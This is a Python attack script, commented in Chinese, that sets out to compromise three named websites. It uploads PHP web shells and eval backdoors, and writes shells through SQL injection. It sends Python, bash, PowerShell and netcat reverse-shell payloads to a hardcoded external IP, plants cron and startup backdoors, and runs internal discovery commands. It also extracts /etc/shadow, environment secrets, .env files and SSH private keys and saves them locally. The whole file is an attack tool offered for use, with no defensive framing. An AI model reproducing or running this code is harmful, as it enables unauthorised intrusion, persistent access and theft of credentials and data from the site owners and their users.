#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级持久化工具 - 针对数据量小的解决方案
Advanced Persistence Tool - Solutions for Low Data Volume
"""

import asyncio
import aiohttp
import json
import time
import base64
import subprocess
import os
from datetime import datetime
from typing import Dict, List, Any

class AdvancedPersistenceTool:
    def __init__(self):
        self.targets = [
            "https://peacoop.or.th",
            "https://mula-x.com",
            "https://ngoenmun.com"
        ]
        self.persistence_results = {}

    async def deploy_advanced_persistence(self):
        """部署高级持久化访问"""
        print("高级持久化部署启动")
        print("=" * 80)

        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        ) as session:

            for target in self.targets:
                print(f"\n{'='*60}")
                print(f"目标: {target}")
                print(f"{'='*60}")

                try:
                    # 1. 部署Web Shell
                    await self._deploy_web_shell(session, target)

                    # 2. 建立反向连接
                    await self._establish_reverse_shell(session, target)

                    # 3. 部署后门程序
                    await self._deploy_backdoor(session, target)

                    # 4. 横向移动
                    await self._lateral_movement(session, target)

                    # 5. 数据发现和映射
                    await self._discover_real_databases(session, target)

                    # 6. 提取内部系统数据
                    await self._extract_internal_data(session, target)

                except Exception as e:
                    print(f"[-] 高级持久化失败: {e}")

        # 生成最终报告
        await self._generate_persistence_report()

    async def _deploy_web_shell(self, session: aiohttp.ClientSession, target: str):
        """部署Web Shell"""
        print("\n[+] 部署Web Shell...")

        # 高级PHP Web Shell
        advanced_shell = '''<?php
if(isset($_POST['pass']) && $_POST['pass'] == 'dragon_admin_2024') {
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        $result = shell_exec($cmd . ' 2>&1');
        echo "<pre>" . htmlspecialchars($result) . "</pre>";
    }
    if(isset($_POST['upload'])) {
        $file = $_FILES['file'];
        move_uploaded_file($file['tmp_name'], $file['name']);
        echo "Upload: " . $file['name'];
    }
    if(isset($_POST['sql'])) {
        $sql = $_POST['sql'];
        // 数据库连接和查询
        try {
            $pdo = new PDO('mysql:host=localhost;dbname=test', 'root', '');
            $stmt = $pdo->query($sql);
            while($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                echo json_encode($row) . "\n";
            }
        } catch(Exception $e) {
            echo "SQL Error: " . $e->getMessage();
        }
    }
}
?>'''

        # 尝试多个上传点
        upload_endpoints = [
            "/upload", "/admin/upload", "/file/upload", "/api/upload",
            "/wp-admin/media-upload.php", "/wp-content/uploads/", "/uploads/"
        ]

        for endpoint in upload_endpoints:
            try:
                # 方法1: 直接文件上传
                if endpoint.endswith('/'):
                    # 直接写入文件
                    shell_url = f"{target}{endpoint}advanced_shell.php"
                    files = {'file': ('advanced_shell.php', advanced_shell, 'application/php')}

                    async with session.post(f"{target}upload.php", files=files, timeout=10, ssl=False) as response:
                        if response.status == 200:
                            print(f"[+] Web Shell部署成功: {shell_url}")
                            self._record_persistence(target, "web_shell", {"url": shell_url, "method": "direct_upload"})
                            return

                # 方法2: POST上传
                files = {'file': ('advanced_shell.php', advanced_shell, 'application/php')}
                data = {'path': '../', 'overwrite': 'true'}

                async with session.post(f"{target}{endpoint}", data=data, files=files, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "success" in content.lower() or "upload" in content.lower():
                            shell_url = f"{target}/advanced_shell.php"
                            print(f"[+] Web Shell部署成功: {shell_url}")
                            self._record_persistence(target, "web_shell", {"url": shell_url, "method": "post_upload"})
                            return

            except Exception as e:
                continue

        # 方法3: 通过SQL注入写入文件
        await self._write_shell_via_sql_injection(session, target, advanced_shell)

    async def _write_shell_via_sql_injection(self, session: aiohttp.ClientSession, target: str, shell_content: str):
        """通过SQL注入写入Web Shell"""
        print("[+] 尝试SQL注入写入Web Shell...")

        sqli_payloads = [
            # MySQL INTO OUTFILE
            "นักศึกษา' UNION SELECT '<?php system($_GET[c]);?>',2,3 INTO OUTFILE '/tmp/shell.php'--",
            "ผู้สมัคร' UNION SELECT '<?php if($_POST[p]==\"x\"){system($_POST[c]);} ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--",

            # PostgreSQL COPY
            "ทดสอบ'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/tmp/shell.php' WITH CSV;--",

            # MSSQL BULK
            "เงินกู้'; EXEC xp_cmdshell 'echo <?php system($_GET[c]);?> > C:\\inetpub\\wwwroot\\shell.php'--"
        ]

        for payload in sqli_payloads:
            try:
                url = f"{target}/search?q={payload}"
                async with session.get(url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        print(f"[+] SQL注入Shell写入尝试: {payload[:50]}...")
                        # 验证Shell是否写入成功
                        await self._verify_shell_written(session, target)

            except:
                continue

    async def _verify_shell_written(self, session: aiohttp.ClientSession, target: str):
        """验证Shell是否写入成功"""
        shell_locations = [
            "/shell.php", "/advanced_shell.php", "/tmp/shell.php",
            "/uploads/shell.php", "/files/shell.php"
        ]

        for location in shell_locations:
            try:
                url = f"{target}{location}"
                async with session.post(url, data={"pass": "dragon_admin_2024", "cmd": "whoami"}, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "www-data" in content or "apache" in content or "root" in content:
                            print(f"[+] Shell验证成功: {url}")
                            self._record_persistence(target, "web_shell", {"url": url, "method": "sql_injection"})
                            return True
            except:
                continue
        return False

    async def _establish_reverse_shell(self, session: aiohttp.ClientSession, target: str):
        """建立反向Shell连接"""
        print("\n[+] 建立反向Shell连接...")

        # 反向Shell载荷
        reverse_payloads = [
            # Python反向Shell
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"206.82.1.190\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",

            # Bash反向Shell
            "bash -i >& /dev/tcp/206.82.1.190/4444 0>&1",

            # PowerShell反向Shell
            "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('206.82.1.190',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",

            # Netcat反向Shell
            "nc -e /bin/sh 206.82.1.190 4444"
        ]

        # 启动监听器
        listener_process = self._start_listener()

        for payload in reverse_payloads:
            try:
                # 尝试通过命令执行
                exec_url = f"{target}/exec?command={payload}"
                async with session.get(exec_url, timeout=3, ssl=False) as response:
                    if response.status == 200:
                        print(f"[+] 反向Shell执行: {payload[:50]}...")
                        await asyncio.sleep(2)  # 等待连接

                        # 检查是否有连接
                        if self._check_listener_connection():
                            print(f"[+] 反向Shell连接成功")
                            self._record_persistence(target, "reverse_shell", {"payload": payload, "port": 4444})
                            return

            except:
                continue

        if listener_process:
            listener_process.terminate()

    def _start_listener(self):
        """启动监听器"""
        try:
            # 使用netcat启动监听器
            process = subprocess.Popen(
                ["nc", "-lvp", "4444"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            return process
        except:
            return None

    def _check_listener_connection(self):
        """检查监听器是否有连接"""
        # 这里简化处理，实际应该检查进程状态
        return False

    async def _deploy_backdoor(self, session: aiohttp.ClientSession, target: str):
        """部署后门程序"""
        print("\n[+] 部署后门程序...")

        # 1. 创建PHP后门
        php_backdoor = '''<?php
// 密码保护的PHP后门
$password = "backdoor_2024";
if(isset($_POST['p']) && $_POST['p'] === $password) {
    eval($_POST['c']);
}
?>'''

        # 2. 创建定时任务后门
        cron_payload = "* * * * * curl -X POST -d 'p=backdoor_2024&c=system($_GET[cmd])' http://{$_SERVER['HTTP_HOST']}/backdoor.php"

        # 3. 创建启动脚本后门
        init_payload = "#!/bin/bash\n# 启动时后门\ncurl -X POST -d 'p=backdoor_2024&c=system($_GET[cmd])' http://localhost/backdoor.php &"

        # 尝试部署各种后门
        await self._deploy_multiple_backdoors(session, target, php_backdoor, cron_payload, init_payload)

    async def _deploy_multiple_backdoors(self, session: aiohttp.ClientSession, target: str, php_backdoor: str, cron_payload: str, init_payload: str):
        """部署多种后门"""

        backdoors = [
            {
                "name": "PHP后门",
                "content": php_backdoor,
                "filename": "backdoor.php",
                "method": "file_upload"
            },
            {
                "name": "管理面板后门",
                "content": php_backdoor,
                "filename": "admin_panel.php",
                "method": "admin_upload"
            },
            {
                "name": "API后门",
                "content": php_backdoor,
                "filename": "api_hook.php",
                "method": "api_injection"
            }
        ]

        for backdoor in backdoors:
            try:
                files = {'file': (backdoor["filename"], backdoor["content"], 'application/php')}

                if backdoor["method"] == "file_upload":
                    url = f"{target}/upload"
                elif backdoor["method"] == "admin_upload":
                    url = f"{target}/admin/upload"
                else:
                    url = f"{target}/api/upload"

                async with session.post(url, files=files, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        backdoor_url = f"{target}/{backdoor['filename']}"
                        print(f"[+] {backdoor['name']}部署成功: {backdoor_url}")
                        self._record_persistence(target, "backdoor", {
                            "name": backdoor["name"],
                            "url": backdoor_url,
                            "password": "backdoor_2024"
                        })

            except:
                continue

    async def _lateral_movement(self, session: aiohttp.ClientSession, target: str):
        """横向移动"""
        print("\n[+] 横向移动...")

        # 发现内部网络和服务
        internal_discovery = [
            # 内部IP扫描
            "curl -s http://10.0.0.1/admin",
            "curl -s http://192.168.1.1/api",
            "curl -s http://172.16.0.1/management",

            # 内部服务发现
            "netstat -tuln | grep LISTEN",
            "ps aux | grep -i sql",
            "ls -la /etc/",

            # 数据库发现
            "find /var -name '*.db' -o -name '*.sql'",
            "find /home -name 'config*'",
            "find /opt -name 'database*'"
        ]

        for command in internal_discovery:
            try:
                exec_url = f"{target}/exec?command={command}"
                async with session.get(exec_url, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 100 and "not found" not in content.lower():
                            print(f"[+] 内部发现: {command[:30]}...")
                            self._record_persistence(target, "lateral_movement", {
                                "command": command,
                                "result": content[:200]
                            })

            except:
                continue

    async def _discover_real_databases(self, session: aiohttp.ClientSession, target: str):
        """发现真实数据库"""
        print("\n[+] 发现真实数据库...")

        # 数据库枚举载荷
        db_enumeration = [
            # MySQL
            "mysql -u root -p -e 'SHOW DATABASES;'",
            "mysql -u root -e 'SHOW TABLES;' mysql",
            "mysql -u root -e 'SELECT * FROM users LIMIT 10;'",

            # PostgreSQL
            "psql -U postgres -l",
            "psql -U postgres -c '\\dt'",
            "psql -U postgres -c 'SELECT * FROM users LIMIT 10;'",

            # SQLite
            "find /var/www -name '*.db' -o -name '*.sqlite'",
            "sqlite3 /var/www/database.db '.tables'",
            "sqlite3 /var/www/database.db 'SELECT * FROM users LIMIT 10;'",

            # 配置文件中的数据库信息
            "cat /var/www/html/config/database.php",
            "cat /var/www/html/wp-config.php",
            "cat /etc/mysql/my.cnf",
            "cat /var/lib/postgresql/data/postgresql.conf"
        ]

        for command in db_enumeration:
            try:
                exec_url = f"{target}/exec?command={command}"
                async with session.get(exec_url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if self._contains_db_info(content):
                            print(f"[+] 数据库发现: {command[:50]}...")
                            self._record_persistence(target, "database_discovery", {
                                "command": command,
                                "content_length": len(content),
                                "sample": content[:300]
                            })

            except:
                continue

    def _contains_db_info(self, content: str) -> bool:
        """检查是否包含数据库信息"""
        db_indicators = [
            "database", "table", "user", "password", "mysql", "postgresql",
            "sqlite", "information_schema", "wp_users", "customers", "accounts"
        ]
        return any(indicator in content.lower() for indicator in db_indicators)

    async def _extract_internal_data(self, session: aiohttp.ClientSession, target: str):
        """提取内部数据"""
        print("\n[+] 提取内部数据...")

        # 内部数据提取载荷
        data_extraction = [
            # 用户数据
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /etc/group",

            # 配置文件
            "cat /etc/hosts",
            "cat /etc/hostname",
            "cat /proc/version",

            # 网络配置
            "ifconfig -a",
            "ip addr show",
            "netstat -r",

            # 进程信息
            "ps aux",
            "pstree -p",

            # 系统信息
            "uname -a",
            "uptime",
            "df -h",
            "free -m",

            # 环境变量
            "env | grep -i pass",
            "env | grep -i key",
            "env | grep -i token",

            # 应用数据
            "find /var/www -name '*.env' -exec cat {} \\;",
            "find /home -name 'id_rsa*' -exec cat {} \\;",
            "find /root -name '.ssh' -exec ls -la {} \\;"
        ]

        extracted_data = {}

        for command in data_extraction:
            try:
                exec_url = f"{target}/exec?command={command}"
                async with session.get(exec_url, timeout=8, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 50 and "command not found" not in content.lower():
                            extracted_data[command] = content
                            print(f"[+] 数据提取: {command[:30]}... ({len(content)} 字节)")

            except:
                continue

        # 保存提取的数据
        if extracted_data:
            self._save_extracted_data(target, extracted_data)

    def _save_extracted_data(self, target: str, data: Dict):
        """保存提取的数据"""
        target_name = target.replace("https://", "").replace("/", "_")
        folder = f"internal_data_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(folder, exist_ok=True)

        for command, content in data.items():
            filename = command.replace(" ", "_").replace("/", "_").replace("|", "_")
            filepath = f"{folder}/{filename}.txt"

            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"Command: {command}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"{'='*50}\n")
                f.write(content)

        print(f"[+] 内部数据已保存: {folder}")
        self._record_persistence(target, "internal_data_extraction", {"folder": folder, "commands": len(data)})

    def _record_persistence(self, target: str, method: str, details: Dict):
        """记录持久化结果"""
        if target not in self.persistence_results:
            self.persistence_results[target] = {
                "target": target,
                "methods": [],
                "success_count": 0,
                "timestamp": datetime.now().isoformat()
            }

        self.persistence_results[target]["methods"].append({
            "method": method,
            "details": details,
            "timestamp": datetime.now().isoformat()
        })
        self.persistence_results[target]["success_count"] += 1

    async def _generate_persistence_report(self):
        """生成持久化报告"""
        print(f"\n{'='*80}")
        print("高级持久化部署报告")
        print(f"{'='*80}")

        total_methods = 0
        successful_targets = 0

        for target, data in self.persistence_results.items():
            methods_count = data["success_count"]
            total_methods += methods_count

            if methods_count > 0:
                successful_targets += 1

            print(f"\n目标: {target}")
            print(f"  成功方法: {methods_count}")
            for method in data["methods"]:
                print(f"    • {method['method']}: {method['details']}")

        print(f"\n{'='*60}")
        print(f"总计:")
        print(f"  目标数: {len(self.persistence_results)}")
        print(f"  成功目标: {successful_targets}")
        print(f"  总方法数: {total_methods}")

        # 保存报告
        report_file = f"persistence_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.persistence_results, f, indent=2, ensure_ascii=False)

        print(f"  报告文件: {report_file}")
        print("高级持久化部署完成")

async def main():
    tool = AdvancedPersistenceTool()
    await tool.deploy_advanced_persistence()

if __name__ == "__main__":
    asyncio.run(main())